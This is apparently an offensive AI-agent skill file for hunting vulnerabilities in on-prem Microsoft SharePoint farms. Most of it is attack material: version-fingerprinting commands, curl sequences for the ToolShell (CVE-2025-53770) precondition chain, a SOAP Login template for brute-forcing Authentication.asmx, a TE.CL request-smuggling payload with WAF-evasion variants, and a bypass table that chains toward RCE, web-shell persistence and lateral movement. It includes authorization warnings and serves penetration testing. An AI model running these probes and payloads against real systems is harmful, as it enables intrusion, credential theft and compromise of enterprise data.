---
name: hunt-sharepoint
description: Hunt Microsoft SharePoint Server (2013/2016/2019/Subscription Edition)
  on-prem farms
category: security
risk: offensive
source: https://github.com/elementalsouls/Claude-BugHunter
source_repo: elementalsouls/Claude-BugHunter
source_type: community
date_added: '2026-09-20'
license: MIT
license_source: https://github.com/elementalsouls/Claude-BugHunter/blob/main/LICENSE
compatibility: Requires explicit written authorization for a target scope plus the
  relevant testing tools for this technique. Docs-only; helper scripts and commands
  not bundled.
sources: github, authorized-engagement
report_count: 1
---
> **⚠️ AUTHORIZED USE ONLY**
> This skill is for educational purposes or authorized security assessments only.
> You must have explicit, written permission from the system owner before using this tool.
> Misuse of this tool is illegal and strictly prohibited.

> **Mandatory confirmation gate**
> Before running any command that probes, exploits, changes, persists on, extracts data from, or attempts credential access against a target:
> 1. Ask the user to state the exact target URL, IP, account, or resource.
> 2. Ask the user to confirm written authorization and the permitted scope.
> 3. Show the exact command(s) and explain their expected effect.
> 4. Wait for explicit confirmation in the current conversation.
>
> Without that confirmation, remain read-only and provide defensive guidance only. Prefer a sandbox, disposable VM, or controlled lab.

## Crown Jewel Targets

SharePoint Server (on-prem) is one of the richest enterprise attack surfaces in 2025-2026 bug bounty / red-team work. Three forces converge:

1. **End-of-life unpatched code paths.** SharePoint Server 2013 reached extended-support EoL on 2023-04-11 (final build `15.0.5545.1000` / KB5002381). Every SharePoint CVE published after that date is **permanently unpatched** on SP2013 farms. SP2016 reaches EoL 2026-07-14; SP2019 reaches EoL 2026-07-14 (next 2 months as of May 2026); only SP Subscription Edition is currently in active support.
2. **CVE-2025-53770 / 53771 "ToolShell"** — July 2025 emergency-out-of-band patch chain for SPE / SP2019 / SP2016. The vulnerable code path (anonymous `/_layouts/15/ToolPane.aspx?DisplayMode=Edit` + anonymous `__REQUESTDIGEST` + unencrypted ViewState) is present in **SP2013 too** and will never receive a fix.
3. **Custom branded login pages forget legacy SOAP login.** `/_vti_bin/Authentication.asmx` with the `Login` SOAP op is the SharePoint equivalent of WordPress XMLRPC bypass — accepts native Forms credentials anonymously with no rate limit on most farms even when the branded UI has lockout.

**Highest-value SharePoint targets:**

- **SP2013 farms still on the public internet** — every CVE since April 2023 is unpatched. Critical-severity findings.
- **Dealer / partner / supplier portals** built on SharePoint by enterprise integrators (German VW group, a enterprise system integrator, etc.) — high-impact business data, often nested inside corporate AD trees.
- **SharePoint farms with anonymous Forms-auth zones** — Authentication.asmx becomes anonymously brute-forceable.
- **SharePoint inside corporate AD parent forests** — NTLM Type-2 leak (see `hunt-ntlm-info`) discloses the parent forest membership.
- **Telerik-integrated SharePoint installations** — additional deserialization sinks on top of SP's own.

**Asset types that pay most:** internet-reachable SP Server (any version) > SP Online with custom solutions hooks > intranet SP only after VPN compromise.

---

## Attack Surface Signals

**Response-header fingerprints (any one is sufficient — usually multiple co-occur):**
```
SPRequestGuid: <GUID>                           (always — anonymous and authenticated)
X-MS-InvokeApp: 1; RequireReadOnly              (SharePoint web request)
X-SharePointHealthScore: 0                      (SharePoint specific)
SPIisLatency: <ms>                              (SharePoint internal timing)
SPRequestDuration: <ms>                         (SharePoint request duration)
MicrosoftSharePointTeamServices: 15.0.0.0      (often stripped by ELB — but if present, exact version)
X-Forms_Based_Auth_Required: <login URL>        (Forms-auth zone indicator)
X-Forms_Based_Auth_Return_Url: <return URL>     (Forms-auth zone indicator)
X-MSDAVEXT_Error: 917656; Access denied...      (WebDAV extension active)
DAV: 1, 2                                       (WebDAV verbs supported)
Set-Cookie: ASP.NET_SessionId=...               (always — IIS session)
Set-Cookie: FedAuth=...; rtFa=...               (claims-mode auth)
Set-Cookie: WSS_FullScreenMode=...              (SharePoint UI mode)
```

**URL / path fingerprints:**
```
/_layouts/15/                  (SP2013+ layouts root — SP2010 used /_layouts/ without the 15)
/_layouts/14/                  (legacy SP2010 — almost EoL since 2020-10-13)
/_layouts/16/                  (some SP2019 / SPE)
/_vti_bin/                     (FrontPage-RPC + SOAP services)
/_vti_pvt/                     (FrontPage-RPC config — usually 403)
/_vti_inf.html                 (almost always anonymous; contains FPVersion banner)
/_api/                         (modern REST API)
/_api/$metadata                (OData metadata — often anonymous + large)
/_api/contextinfo              (FormDigest issuer — POST only)
/_catalogs/                    (site catalogs: masterpage, wp, lt, theme, solutions)
/_catalogs/users/simple.aspx   (user list — usually 403)
/_layouts/15/start.aspx        (anonymous landing — leaks version)
/_layouts/15/ToolPane.aspx     (web part editor — ToolShell sink)
/_layouts/15/Picker.aspx       (people/list picker — SafeControl recon)
/_layouts/15/download.aspx     (SP-internal file resolver — NOT outbound SSRF)
/_layouts/15/Authenticate.aspx (forms-auth redirector)
/_layouts/15/SignOut.aspx      (logout)
/_layouts/15/error.aspx        (error page — anonymous)
/_layouts/15/AccessDenied.aspx (denied page — anonymous)
/_layouts/15/scriptresx.ashx?culture=en-us&name=core    (resource bundle leak)
/_layouts/15/<Customer>/       (custom-branding modules — see Methodology step 8)
/_vti_bin/Authentication.asmx  (THE legacy login bypass — see hunt-auth-bypass Legacy-Protocol Matrix)
/_vti_bin/SharedAccess.asmx    (often anon-readable)
/_vti_bin/lists.asmx           (auth-required on hardened farms)
/_vti_bin/sites.asmx           (auth-required on hardened farms)
/_vti_bin/sts/                 (Security Token Service — usually 302 to error)
/sites/<name>/                 (site collections)
/personal/<user>/              (MySite / OneDrive-for-Business)
```

**Body signals (in HTML responses):**
```
<meta name="GENERATOR" content="Microsoft SharePoint" />
RegisterSod("...","/_layouts/15/...");                    (Script-on-demand registration)
var g_initUrl='';                                          (start.aspx MDS state)
__REQUESTDIGEST                                            (CSRF token — leaks even to anon if endpoint mis-configured)
__VIEWSTATEENCRYPTED=""                                    (Sign-only ViewState — see hunt-aspnet)
"LibraryVersion":"15.0.X.XXXX"                             (in _api/contextinfo response)
Version:15, webPermMasks:{High:0,Low:                      (in start.aspx body)
HelpWindowKey('WSSEndUser_troubleshooting                  (anonymous error.aspx body)
```

**Tech-stack signals:**
- `Server: Microsoft-IIS/10.0` + paths starting with `/_layouts/15/` → SharePoint 2013/2016/2019/SE
- AWS ELB / ALB in front of SharePoint → cross-node ViewState MAC issues possible (see hunt-aspnet)
- `WWW-Authenticate: NTLM` on `/_api/web/CurrentUser` → dual-auth (Forms + NTLM); use `hunt-ntlm-info` for AD-topology disclosure
- `*.test.<customer>.tld` → test/staging mirror of production SharePoint; data often mirrored from prod

---

## Step-by-Step Hunting Methodology

1. **Fingerprint the SharePoint version.** Build number leaks anonymously through several paths. Map the result to the CVE matrix immediately.

   ```bash
   # Method 1: _vti_inf.html (always anonymous, always present)
   curl -sk "https://target.example/_vti_inf.html"
   # → FPVersion="15.00.0.000" (15.x = SP2013, 16.x = SP2016/2019/SE)

   # Method 2: _api/contextinfo POST (anonymous on most farms)
   curl -sk -X POST "https://target.example/_api/contextinfo" \
     -H "Accept: application/json;odata=verbose" \
     | jq -r '.d.GetContextWebInformation.LibraryVersion'
   # → "15.0.5545.1000" (full build number)

   # Method 3: /_layouts/15/start.aspx body
   curl -sk "https://target.example/_layouts/15/start.aspx" \
     | grep -oE "15\.[0-9]+\.[0-9]+\.[0-9]+|16\.[0-9]+\.[0-9]+\.[0-9]+"
   ```

   **Map to CVE matrix:**

   | Build | Edition | Status | Notable unpatched-after-EoL CVEs |
   |---|---|---|---|
   | `15.0.5545.1000` | SP2013 final CU | **EoL 2023-04-11** | CVE-2023-29357, CVE-2023-33160/33157/36941, CVE-2024-21318/30043/38023/38024/38094, CVE-2025-53770/53771, CVE-2025-29794 |
   | `16.0.10416.x` | SP2016 | EoL 2026-07-14 | depends on patch level |
   | `16.0.10417.x+` | SP2019 / SE | active | check Microsoft's monthly Patch Tuesday |

2. **Anonymous-endpoint matrix probe.** Walk every endpoint in the table below in one pass. Anything anonymous becomes part of the attack chain.

   ```
   /_vti_inf.html                                          → version disclosure
   /_layouts/15/start.aspx                                 → version disclosure + session minting
   /_layouts/15/blank.htm                                  → benign anchor for smuggling probes
   /_layouts/15/error.aspx                                 → request-validator behaviour probe
   /_layouts/15/Authenticate.aspx?Source=                  → redirect-chain behaviour
   /_layouts/15/AccessDenied.aspx?Source=                  → redirect-chain behaviour
   /_layouts/15/SignOut.aspx                               → logout — anonymous OK
   /_layouts/15/closeConnection.aspx                       → anonymous OK
   /_layouts/15/scriptresx.ashx?culture=en-us&name=SP.Res  → 35KB localised strings
   /_layouts/15/scriptresx.ashx?culture=en-us&name=core    → 277KB localised strings
   /_layouts/15/ToolPane.aspx?DisplayMode=Edit             → ToolShell precondition (THIS IS THE BIG ONE)
   /_layouts/15/Picker.aspx                                → SafeControl recon (see step 6)
   /_layouts/15/<CustomerName>/pages/login/customlogin.aspx    → custom Forms login (replace `<CustomerName>` with target's customer name)
   /_vti_bin/Authentication.asmx                           → legacy SOAP login — anonymous brute-force (CRITICAL)
   /_vti_bin/Authentication.asmx?WSDL                      → WSDL — confirms Login + Mode ops
   /_vti_bin/SharedAccess.asmx                             → often anonymous
   /_vti_bin/spsdisco.aspx                                 → SP service discovery
   /_api/contextinfo (POST)                                → anonymous FormDigest mint (HIGH)
   /_api/$metadata                                         → 381KB API surface enumeration
   /_api/Search                                            → search service descriptor
   /_api/web/CurrentUser                                   → 401 anon BUT WWW-Authenticate: NTLM leaks AD info (see hunt-ntlm-info)
   ```

3. **Legacy SOAP login bypass via Authentication.asmx.** Cross-reference `hunt-auth-bypass` Legacy-Protocol Matrix. The standard probe:

   ```bash
   # First: confirm Mode = Forms (else this attack vector is N/A)
   curl -sk -X POST "https://target.example/_vti_bin/Authentication.asmx" \
     -H "Content-Type: text/xml; charset=utf-8" \
     -H "SOAPAction: http://schemas.microsoft.com/sharepoint/soap/Mode" \
     -d '<?xml version="1.0"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><Mode xmlns="http://schemas.microsoft.com/sharepoint/soap/" /></soap:Body></soap:Envelope>'
   # → <ModeResult>Forms</ModeResult>  ← target is exploitable
   # → <ModeResult>Windows</ModeResult>  ← target uses Windows auth only; this vector N/A

   # Then: confirm no rate limit / no lockout (synthetic non-existent users ONLY)
   # Send 10 bursts at "burst-test-synthetic-zzz" with distinct wrong passwords
   # If all 10 return 200 / 431 bytes / uniform timing → confirmed unlimited brute-force surface
   ```

   **Severity:** Critical when anonymous + no rate limit + no lockout. Submit as bug-bounty even before demonstrating successful auth — the *unbounded credential validation* is the bug, not "I cracked X credential."

4. **ToolShell precondition chain probe** (CVE-2025-53770 class). Three sub-requests:

   ```bash
   # Sub-step a: anonymous GET on ToolPane.aspx
   curl -sk "https://target.example/_layouts/15/ToolPane.aspx?DisplayMode=Edit"
   # Body should contain: __REQUESTDIGEST="0x...,..."  AND  __VIEWSTATEENCRYPTED=""
   # If both: precondition stack is anonymous-reachable.

   # Sub-step b: anonymous POST to /_api/contextinfo
   curl -sk -X POST "https://target.example/_api/contextinfo" \
     -H "Accept: application/json;odata=verbose" \
     | jq -r '.d.GetContextWebInformation.FormDigestValue'
   # Should return a valid digest with 1800s validity.

   # Sub-step c: anonymous POST to ToolPane.aspx with that digest as X-RequestDigest
   curl -sk -X POST "https://target.example/_layouts/15/ToolPane.aspx?DisplayMode=Edit" \
     -H "X-RequestDigest: <digest from step b>" \
     --data "MSOSPWebPartManager_DisplayModeName=Browse&MSOTlPn_Button=none"
   # Should return 200 OK — server treats anonymous-with-digest as authorised state-changing POST.
   ```

   **Severity:** Critical on EoL SP2013 (no patch will ever ship). High on SP2016/2019/SE if `__VIEWSTATEENCRYPTED` is non-empty (encrypted ViewState mitigates the deserialization arm but precondition still warns of misconfig).

   **IMPORTANT:** Do NOT actually deliver a malicious ViewState payload. The precondition chain is sufficient evidence for the report. In the real CVE-2025-53770 chain, machineKey recovery is NOT a precondition for RCE: the auth-bypass (CVE-2025-49706, crafted Referer to ToolPane.aspx) + insecure deserialization (CVE-2025-49704) yield an initial web shell with no machineKey knowledge. The `<machineKey>` (ValidationKey/DecryptionKey) is then DUMPED by that web shell and used to forge signed `__VIEWSTATE` for persistent/unauthenticated re-exploitation. So machineKey is the loot of the first RCE and the persistence arm, not a gate in front of it — do not under-assess an exploitable farm just because machineKey is unknown.

5. **NTLM Type-2 AD topology disclosure.** Cross-reference `hunt-ntlm-info` for full methodology. Quick check:

   ```bash
   # Use Burp send_http1_request with keep-alive, or Python raw socket
   # Anonymous Type-1 with NetBIOS-info request flag:
   #   Authorization: NTLM TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAGAbEdAAAADw==
   # Decode the Type-2 challenge → leaks NetBIOS domain, DNS forest, computer name
   ```

   **Severity:** Medium when chained with internet exposure + default `WIN-XXXXXXXXXXX` hostname; Informational otherwise.

6. **SafeControl enumeration via Picker.aspx.** Picker.aspx differentiates two error states by class existence:
   - Type EXISTS but not whitelisted: `"Only PickerDialog types can be used with the dialog. The type should be configured as a safecontrol in this site."`
   - Type DOES NOT exist: `"Could not load type '<Class>' from assembly 'Microsoft.SharePoint, Version=15.0.0.0, Culture=neutral, PublicKeyToken=71e9bce111e9429c'."`

   Feed a wordlist of `Microsoft.SharePoint.*.WebControls.*` and `Microsoft.SharePoint.WebPartPages.*` types to enumerate reachable classes. The list itself is recon for CVE-2019-0604-family chains.

   ```bash
   for cls in \
     "Microsoft.SharePoint.WebControls.PeopleEditor" \
     "Microsoft.SharePoint.WebControls.ItemPicker" \
     "Microsoft.SharePoint.WebPartPages.DataFormWebPart" \
     ; do
     curl -sk "https://target.example/_layouts/15/Picker.aspx?PickerDialogType=$(python3 -c 'import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))' "$cls")&typeName=System.String" \
       | grep -oE "<title>[^<]+</title>"
   done
   ```

7. **`download.aspx` is NOT outbound SSRF — recognize and don't waste time.** SP's `/_layouts/15/download.aspx?SourceUrl=` is an **SP-internal path resolver**, not a generic URL fetcher. Behaviours:
   - External URL (`http://evil.example.com/x`) → 500 with `"The Web application at <URL> could not be found"` — server tried to resolve as an SP web app, didn't fetch.
   - Same-origin file URL → 500 with `"<nativehr>0x81070211</nativehr>...Cannot open file '<path>'"` — server tried SPFile.OpenBinary, file not found.
   - Files matching the extension blocklist (`.ashx`, `.asmx`, `.svc`, `.config`) → 500 with `"file blocked from this Web site by the server administrators"` regardless of whether the file exists.
   - `file://`, UNC paths, `gopher://`, etc. → 500 with `"Value does not fall within the expected range"` — URL-scheme validator rejects.

   **The error-message URL echo is NOT confirmation of SSRF.** Confirm via Burp Collaborator OOB before claiming. (Cross-reference `hunt-ssrf` OOB-Or-It-Didn't-Happen Gate.) Verified negative in authorized engagement: 38 Collaborator-tagged payloads across 12+ URL-accepting SP parameters → zero callbacks.

   The extension blocklist also looks like a "file-existence oracle" (existing vs not-found returns different responses) but it's actually just the SP file-extension policy. Don't infer file presence from the blocklist response.

8. **Custom-branding module enumeration.** Customer-customised SP installations almost always have a `/_layouts/15/<CustomerName>/` directory tree. Find the name from the login URL (e.g. `/_layouts/15/<CustomerName>/pages/login/customlogin.aspx` → customer name is `<CustomerName>`). Then probe:

   ```bash
   for sub in pages Pages js Js JS css scripts handlers controls images config data services api; do
     curl -sk -o /dev/null -w "%{http_code} %{size_download}\n" \
       "https://target.example/_layouts/15/CustomerName/$sub/"
     # 301/302 with auth-redirect = directory exists; 404 = missing; 403 = directory listing blocked but path valid
   done
   ```

   JS bundles often contain hardcoded endpoint URLs, hidden routes, internal API paths. Pull each with proper `Referer` header (some are referer-gated).

9. **Search service probe.** `/_api/Search` returns a small JSON descriptor anonymously. `/_api/search/query?querytext='X'` returns 500 with stack trace if the Search Service Application is not running — useful infra disclosure but not directly exploitable.

10. **Authenticated post-login surfaces** (if you have valid credentials):
    - `/_api/web/Lists` — enumerate lists
    - `/_api/web/SiteUsers` — enumerate users
    - `/_api/web/getfolderbyserverrelativeurl('/Shared Documents')/Files` — file enumeration
    - `/_layouts/15/people.aspx` — user listing
    - Custom customer-branded modules — check for IDOR, business logic
    - Workflow Services (`/_api/SP.WorkflowServices.*`)

---

## Payload & Detection Patterns

**Authentication.asmx Login (the canonical brute-force endpoint):**
```xml
POST /_vti_bin/Authentication.asmx HTTP/1.1
Host: target.example
Content-Type: text/xml; charset=utf-8
SOAPAction: http://schemas.microsoft.com/sharepoint/soap/Login
Content-Length: 376

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <Login xmlns="http://schemas.microsoft.com/sharepoint/soap/">
      <username>USERNAME</username>
      <password>PASSWORD</password>
    </Login>
  </soap:Body>
</soap:Envelope>
```
Response codes:
- `<ErrorCode>NoError</ErrorCode>` → auth success; `<CookieName>FedAuth</CookieName>` and `<TimeoutSeconds>...</TimeoutSeconds>` follow
- `<ErrorCode>PasswordNotMatch</ErrorCode>` → auth fail (uniform for non-existent users too — no enum leak via error string)
- 500 + `<faultstring>Value cannot be null. Parameter name: userName</faultstring>` → empty username

**ToolShell precondition reproduction:**
```bash
# Step 1: anon GET ToolPane.aspx
TP=$(curl -sk "https://target.example/_layouts/15/ToolPane.aspx?DisplayMode=Edit")
echo "$TP" | grep -oE '__VIEWSTATEENCRYPTED" id="__VIEWSTATEENCRYPTED" value="[^"]*"'
# If value="" → precondition

# Step 2: anon FormDigest
DIGEST=$(curl -sk -X POST "https://target.example/_api/contextinfo" \
  -H "Accept: application/json;odata=verbose" \
  | jq -r '.d.GetContextWebInformation.FormDigestValue')
echo "Digest: ${DIGEST:0:40}..."

# Step 3: anon POST ToolPane with digest
curl -sk -X POST -H "X-RequestDigest: $DIGEST" \
  --data "MSOSPWebPartManager_DisplayModeName=Browse&MSOTlPn_Button=none" \
  "https://target.example/_layouts/15/ToolPane.aspx?DisplayMode=Edit" \
  -w "\ncode=%{http_code} size=%{size_download}\n"
```

**HTTP TE.CL smuggling on AWS ELB + SP IIS back-end** (consistent on SP farms behind AWS ELB):
```
POST /_layouts/15/blank.htm HTTP/1.1
Host: target.example
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST /404 HTTP/1.1
Host: x
Content-Length: 15

x=1
0

```
Expected back-end hang: ~12 s vs ~0.16 s baseline (consistent across 5 trials). Obfuscation variants (`Transfer-Encoding : chunked`, `transfer-encoding: chunked`, trailing-space, mixed-case) produce a similar ~6 s hang.

**Picker.aspx SafeControl recon:**
```bash
curl -sk "https://target.example/_layouts/15/Picker.aspx?PickerDialogType=Microsoft.SharePoint.WebPartPages.DataFormWebPart&typeName=System.String" \
  | grep -oE "<title>[^<]+</title>"
# "Only PickerDialog types..." = exists, not whitelisted
# "Could not load type..."    = does not exist
```

---

## Common Root Causes

1. **`/_vti_bin/Authentication.asmx` left enabled on the public-zone IIS binding.** SharePoint admins enable Forms auth on a custom login UI and don't realise the legacy SOAP Login endpoint is independently reachable.

2. **`viewStateEncryption="Auto"` on layouts pages.** SharePoint's default ViewState mode signs-only for pages without sensitive form fields. Pages like ToolPane.aspx have `__VIEWSTATEENCRYPTED=""` — exploitable if machineKey leaks.

3. **`/_api/contextinfo` POST accessible anonymously.** SharePoint Online and SPE 2024-07+ require auth on contextinfo. Earlier versions and most SP2013 farms allow anonymous POST → FormDigest token returned with 1800s validity. This is the second ToolShell precondition.

4. **NTLM enabled on public-zone IIS binding.** Default dual-auth (Forms + NTLM) leaves NTLM Negotiate available to anonymous internet users. Type-2 challenge leaks AD topology.

5. **SP2013 farms past EoL still internet-exposed.** Microsoft extended support ended 2023-04-11. Every post-April-2023 SharePoint CVE is unpatched. Common in enterprise integrator scenarios (system-integrator inside corporate-parent AD, SI-managed dealer portals).

6. **`<SafeControl>` whitelist in web.config trusted as the only gate.** Picker.aspx enforces an `instanceof PickerDialog` check, which is patched against the original CVE-2019-0604 vector — but the underlying SafeControl model itself is anonymously enumerable via the Picker.aspx error differential.

7. **AWS ELB + SP IIS without explicit Transfer-Encoding normalization.** Default ELB forwards `Transfer-Encoding` to back-end IIS; IIS interprets `Content-Length` when both are present in a way that desyncs from ELB. Multiple TE-obfuscation variants bypass simple WAF rules.

8. **Default Windows-installer hostname (`WIN-XXXXXXXXXXX`) never renamed.** Signal of rushed provisioning; correlates with default service-account passwords on SQL backend, default farm-account passwords on Central Admin, etc.

9. **Custom-branding module (`/_layouts/15/<Customer>/`) JS bundles loaded with `?v=YYYYMMDD` query strings.** The query string reveals last-modified date — useful for "this app is actively maintained" vs "this app is abandoned" determination.

10. **Cross-node ViewState MAC failures when AWS ELB doesn't pin session affinity to one WFE.** Operationally broken (users hit 500s on every POST); security-wise broadcasts farm topology in error messages.

---

## Bypass Techniques

| Defense | Bypass / Recon Strategy |
|---|---|
| Branded `customlogin.aspx` with lockout / CAPTCHA / MFA | `/_vti_bin/Authentication.asmx` legacy SOAP — none of those protections apply |
| `WWW-Authenticate: NTLM` requires authenticated callers | Default IIS `extendedProtection=None` lets you elicit the Type-2 challenge anonymously — see `hunt-ntlm-info` |
| `MicrosoftSharePointTeamServices` header stripped at ELB | Body of `/_layouts/15/start.aspx` leaks version anyway; also `/_api/contextinfo`'s `LibraryVersion` |
| `/_vti_bin/lists.asmx` 403 (SharedAccess.asmx / Authentication.asmx still open) | Different services have different ACLs; enumerate all asmx separately |
| `/_api/web/CurrentUser` 401 with stack-trace JSON | Stack traces leak even on auth-deny responses; combine with version disclosure |
| Anonymous `__REQUESTDIGEST` issued (ToolShell precondition) | Pair with anonymous ToolPane POST + unencrypted ViewState; the deserialization sink yields RCE without machineKey — machineKey is then dumped by the shell for persistent re-exploitation |
| Custom error pages set | Trigger different code paths (XML-shaped ViewState → dual-parser error differential — see `hunt-aspnet`) |
| WAF blocks `<` in query | Move payload to Cookie / Referer / SOAP body — request validator doesn't reach those contexts |
| `Microsoft.SharePoint.WebPartPages.DataFormWebPart` blocked via SafeControl patch | Enumerate SafeControl list; find a subclass that bypasses the inheritance gate |
| HTTP/2 H2.CL smuggling | AWS ALBs often don't advertise `h2` ALPN — close that family early via `openssl s_client -alpn h2,http/1.1` |
| Authenticate.aspx wraps `Source=` in ReturnUrl | Test post-auth behavior with valid creds; pre-auth chain wraps everything safely |

---

## Gate 0 Validation

Before writing the report:

1. **What can the attacker DO right now?**
   - Authentication.asmx anonymous + no rate limit → **Critical** (unbounded credential validation; password spray + UPN format from NTLM = end-to-end ATO path)
   - Full ToolShell precondition chain (anon GET + anon FormDigest + anon POST + unencrypted VS) + EoL SP2013 → **Critical** (RCE via well-documented public exploit chain, no patch will ship)
   - NTLM Type-2 AD topology disclosure + default-Windows hostname → **Medium**
   - SP2013 EoL alone → **Medium-Low** (compliance / hygiene; bug-bounty programs vary — some accept, many reject)
   - `download.aspx` URL echo without confirmed Collaborator callback → **NOT SSRF — retract**

2. **Have you reproduced the full chain to attacker-attainable impact?**
   - For Authentication.asmx: 10-burst test with uniform timing (proves no rate limit) is sufficient. Don't actually crack a credential.
   - For ToolShell: precondition chain (steps a+b+c) is sufficient. Don't deliver a malicious payload.
   - For NTLM: AV-pair decode showing AD-topology fields is sufficient.

3. **Can you reproduce in <10 minutes from a clean shell?**
   - Authentication.asmx: 2 curl commands.
   - ToolShell precondition: 3 curl commands.
   - NTLM Type-2: 1 Python snippet (the AV-pair decoder).

---

## Real Impact Examples

### Scenario A — a authorized SharePoint engagement against an EoL on-prem farm

Target: `https://target-portal.example/` — SharePoint Server 2013 build `15.0.5545.1000` (KB5002381 / final EoL April 2023 CU). Tenant = a system-integrator tenant (Swiss <ParentCorp> importer) inside a corporate global AD (`customer.parent-corp.example`). Server hostname `WIN-XXXXXXXXXXX` (default Windows installer pattern).

11 findings shipped: 3 Critical, 2 Medium, 6 Low/Info. The three Criticals:

1. **Authentication.asmx anonymous credential brute-force** — 10-burst test showed uniform 0.6-0.9 s timing with no rate limit, no lockout, no CAPTCHA, no MFA challenge. Identical 431-byte responses.
2. **HTTP request smuggling TE.CL** — 5/5 trials showed 12.18 s back-end hang vs 0.16 s baseline. 4 additional obfuscation variants (space-before-colon, trailing-space, lowercase, mixed-case) showed 6.16 s hang — each bypassing simple WAF rules.
3. **ToolShell precondition chain** — anonymous GET ToolPane.aspx (200) + anonymous POST `/_api/contextinfo` (200, valid FormDigest) + anonymous POST ToolPane.aspx with digest (200, no auth challenge) + `__VIEWSTATEENCRYPTED=""`. Permanent zero-day on EoL SP2013.

Plus Medium-tier: NTLM Type-2 disclosure of full AD topology (`customer.parent-corp.example`, `WIN-XXXXXXXXXXX`); SP2013 EoL exposure.

### Scenario B — `/_layouts/15/download.aspx?SourceUrl=` recognized correctly as NOT-SSRF (saved-time example)

Same target. Initial scan flagged `download.aspx?SourceUrl=http://oob.example.com/` as SSRF because the server echoed the URL in the 500 error title (`"The Web application at http://oob.example.com/ could not be found"`). 38 Collaborator-tagged payloads across 12+ URL-accepting SP parameters → zero DNS/HTTP callbacks. Conclusion: `download.aspx` is an SP-internal `SPWebApplication` / `SPFile` resolver, NOT a generic URL fetcher. The "echo" is server-side error-string formatting. Saved from reporting an N/A finding by following the `hunt-ssrf` OOB-Or-It-Didn't-Happen Gate.

### Scenario C — CVE-2019-0604 patch verification via Picker.aspx

Same target. Feeding `Microsoft.SharePoint.WebPartPages.DataFormWebPart` (the canonical CVE-2019-0604 deserialization gadget) to Picker.aspx returned `"Only PickerDialog types can be used with the dialog. The type should be configured as a safecontrol in this site."` — meaning the type EXISTS and is reachable through reflection, but the dialog framework's `instanceof PickerDialog` patch correctly rejects it. The patch IS in place for the original CVE-2019-0604 vector. The class-existence enumeration itself becomes recon for any future CVE-2019-0604-family chain that doesn't go through the inheritance gate.

---

## Cross-references

- **Authentication.asmx legacy SOAP login** → see `hunt-auth-bypass` Legacy-Protocol Matrix for the WordPress-XMLRPC equivalent pattern.
- **NTLM Type-2 AD-topology disclosure** → see `hunt-ntlm-info` for AV-pair decoder + severity rubric.
- **ViewState dual-parser anti-pattern, machineKey recovery, request validator bypass** → see `hunt-aspnet`.
- **HTTP request smuggling on AWS ELB + IIS** → see `hunt-http-smuggling`.
- **OOB confirmation of any SSRF claim on SP** → see `hunt-ssrf` OOB-Or-It-Didn't-Happen Gate.
- **Engagement-type confirmation before treating hygiene findings as bug-bounty submissions** → see `bb-methodology` PART 0 Mode-Confirmation Gate.

---

## Related Skills & Chains

- **`hunt-auth-bypass`** — Legacy SOAP `/_vti_bin/Authentication.asmx` accepts anonymous Login calls on misconfigured farms. Chain primitive: SharePoint anon SOAP login probe → if response yields cookie or success differential → `hunt-auth-bypass` brute-force matrix (username enumeration via timing, password spray with low-and-slow against the same SOAP endpoint that bypasses ADFS-level lockout) → valid cred → `/_layouts/15/` authenticated surface.
- **`hunt-ntlm-info`** — Every SharePoint farm advertises `WWW-Authenticate: NTLM` anonymously on `/_vti_bin/`. Chain primitive: SharePoint NTLM Type-2 challenge capture → `hunt-ntlm-info` AV_PAIR decode yields NetBIOS domain + internal DNS forest + DC hostname → feed domain into `m365-entra-attack` ROPC user-enumeration spray on tenant tied to that domain.
- **`hunt-aspnet`** — SharePoint is ASP.NET Webforms under the covers; ViewState, machineKey, and SafeControl reflection all apply. Chain primitive: SharePoint version disclosure → confirm patch level missing → `hunt-aspnet` ViewState dual-parser MAC-bypass → deserialization gadget → RCE in `w3wp.exe` as farm account.
- **`hunt-rce`** — ToolShell precondition chain (CVE-2025-53770) is the current high-impact SP RCE path. Chain primitive: ToolShell preconditions met (`/_layouts/15/ToolPane.aspx?DisplayMode=Edit` reachable via the CVE-2025-49706 auth bypass — a crafted `Referer` header pointing at ToolPane.aspx — + version vulnerable) → `hunt-rce` deserialization gadget chain → SYSTEM/farm-account shell → `m365-entra-attack` lateral via stolen on-prem service-account token to Entra-synced identity.
- **`triage-validation`** — SharePoint farms generate a lot of "looks like a finding" hygiene noise (FormDigest issuance, version disclosure, extension blocklist quirks). Chain primitive: run every SP finding through the 7-Question Gate before reporting — most version-disclosure-only findings die at "is this actually exploitable on this farm" without a paired CVE PoC.

## When to Use

- You have explicit, written authorization to assess the target in scope, and the task matches this skill's vulnerability class or technique within a bug-bounty or penetration-test engagement.
- You need the recon, exploitation, or validation workflow described below — executed strictly inside the approved scope.

## Limitations

- Authorized scope only: the confirmation gate above is mandatory before any probing, exploitation, or credential-access command.
- Docs-only import: upstream helper scripts, commands, engine, and research assets are not bundled; reinstall tooling from the source repo when needed.
- Validate every finding (see `triage-validation`) before reporting; report via `report-writing`. Prefer a sandbox, disposable VM, or controlled lab.

### Example

```bash
# Read-only first step; confirm scope before anything active.
cat scope.txt  # target list from the authorized engagement brief
```

> Adapted from [elementalsouls/Claude-BugHunter](https://github.com/elementalsouls/Claude-BugHunter) (MIT); frontmatter, When to Use/Limitations, and safety boundaries added for upstream compliance. Docs-only import: executable helpers, commands, engine, and research assets not bundled.
